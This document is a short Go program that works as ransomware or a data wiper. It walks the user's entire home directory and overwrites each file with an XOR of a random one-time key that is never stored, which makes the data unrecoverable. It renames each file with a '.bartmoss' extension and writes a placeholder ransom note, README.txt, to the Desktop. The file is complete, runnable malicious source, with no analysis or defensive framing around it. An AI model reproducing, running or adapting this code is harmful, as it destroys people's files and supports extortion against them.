package main

import (
	"crypto/rand"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
		return
	}
	desktopPath := filepath.Join(homeDir, "Desktop")
	err = filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			fmt.Println("Skipping path due to error:", path, "error:", err)
			return nil
		}
		if d.IsDir() {
			return nil
		}
		if strings.HasSuffix(path, ".bartmoss") {
			return nil
		}
		content, err := ioutil.ReadFile(path)
		if err != nil {
			fmt.Println("Skipping unreadable file:", path, "error:", err)
			return nil
		}
		key := make([]byte, len(content))
		_, err = rand.Read(key)
		if err != nil {
			fmt.Println("Skipping file due to rand error:", path, "error:", err)
			return nil
		}
		encrypted := make([]byte, len(content))
		for i := 0; i < len(content); i++ {
			encrypted[i] = content[i] ^ key[i]
		}
		err = ioutil.WriteFile(path, encrypted, 0644)
		if err != nil {
			fmt.Println("Skipping unwritable file:", path, "error:", err)
			return nil
		}
		dir := filepath.Dir(path)
		base := filepath.Base(path)
		nwe := strings.TrimSuffix(base, filepath.Ext(base))
		nn := nwe + ".bartmoss"
		np := filepath.Join(dir, nn)
		err = os.Rename(path, np)
		if err != nil {
			fmt.Println("Skipping unrenamable file:", path, "error:", err)
			return nil
		}
		return nil
	})
	if err != nil {
		fmt.Println("Error walking the path:", err)
	}
	filePath := filepath.Join(desktopPath, "README.txt")
	message := "YOUR NOTE HERE\n"
	err = os.WriteFile(filePath, []byte(message), 0644)
	if err != nil {
		fmt.Println("Error writing file:", err)
	}
}